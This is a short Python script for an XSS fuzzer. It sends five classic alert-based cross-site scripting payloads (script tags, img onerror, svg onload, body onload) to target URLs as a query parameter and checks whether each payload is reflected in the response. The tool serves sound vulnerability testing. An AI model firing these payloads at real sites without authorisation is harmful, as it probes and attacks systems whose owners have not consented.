import requests

class XSSFuzzer:
    def __init__(self):
        self.name = "XSS Fuzzer"
        self.payloads = [
            "<script>alert('XSS')</script>",
            "'\"><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<body onload=alert('XSS')>"
        ]

    def run_tests(self, targets):
        results = {}
        for target in targets:
            for payload in self.payloads:
                test_url = f"{target}?xss={payload}"
                status, response_text = self.send_request(test_url)
                is_reflected = self.analyze_response(payload, response_text)
                results[test_url] = {
                    "status": status,
                    "reflected": is_reflected
                }
        return results

    def send_request(self, url):
        try:
            response = requests.get(url, timeout=5)
            return response.status_code, response.text[:500]
        except requests.exceptions.RequestException:
            return "ERROR", "No response"

    def analyze_response(self, payload, response_text):
        return payload in response_text
